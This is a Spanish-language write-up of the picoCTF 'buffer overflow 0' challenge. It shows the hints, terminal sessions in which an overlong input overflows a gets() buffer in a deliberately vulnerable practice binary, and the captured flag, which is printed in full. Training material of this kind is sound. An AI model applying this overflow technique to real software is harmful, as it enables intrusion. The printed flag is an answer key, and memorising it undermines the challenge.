# buffer overflow 0

# Objetivo
Smash the stack Let's start off simple, can you overflow the correct buffer? The program is available [here](https://artifacts.picoctf.net/c/173/vuln). You can view source [here](https://artifacts.picoctf.net/c/173/vuln.c). And connect with it using: `nc saturn.picoctf.net 51532`

# Pistas
- How can you trigger the flag to print?
- If you try to do the math by hand, maybe try and add a few more characters. Sometimes there are things you aren't expecting.
- Run `man gets` and read the BUGS section. How many characters can the program really read?

# Solución
- Descargamos el codigo y el ejecutable
- Para ejecutar el codigo nos dice que tiene que haber un archivo llamado flag.txt
- Lo creamos poniendo cualquier cosa
- Inspeccionamos el codigo y vemo que el input que espera el programa no deve pasar de 16 caracteres porque esto sobrepasa el buffer y salta la exepcion la cual nos da la bandera
```
┌──(kali㉿kali)-[~/picoctf/binary-explotation/buffer-overflow-0]
└─$ chmod +x vuln 
                                                                                  
┌──(kali㉿kali)-[~/picoctf/binary-explotation/buffer-overflow-0]
└─$ ./vuln 
Please create 'flag.txt' in this directory with your own debugging flag.
                                                                                  
┌──(kali㉿kali)-[~/picoctf/binary-explotation/buffer-overflow-0]
└─$ nano flag.txt          
                                                                                  
┌──(kali㉿kali)-[~/picoctf/binary-explotation/buffer-overflow-0]
└─$ ./vuln       
Input: 12345678
The program will exit now
                                                                                  
┌──(kali㉿kali)-[~/picoctf/binary-explotation/buffer-overflow-0]
└─$ nano flag.txt
                                                                                          
┌──(kali㉿kali)-[~/picoctf/binary-explotation/buffer-overflow-0]
└─$ ./vuln
Input: a3qaws4ed5rf6tgy7hu8jiok,pmjhnbug
1234567890daghuisg uoweghcfuisadhnf uiaehfubvisdgicbkvbai egiuk
                                                                                  
┌──(kali㉿kali)-[~/picoctf/binary-explotation/buffer-overflow-0]
└─$ 
```
- Despues de esto nos conectamos al `nc saturn.picoctf.net 51532`
```
┌──(kali㉿kali)-[~/picoctf/binary-explotation/buffer-overflow-0]
└─$ nc saturn.picoctf.net 51532
Input: 1324sed5rf6tgyhujiop
picoCTF{ov3rfl0ws_ar3nt_that_bad_90d2bb58}
                                                                                  
┌──(kali㉿kali)-[~/picoctf/binary-explotation/buffer-overflow-0]
└─$ 

```

# Bandera
picoCTF{ov3rfl0ws_ar3nt_that_bad_90d2bb58}

## Notas adicionales
| comando | descripción |
| ------ | ------ |
| xx | xx |

## Referencias
- []()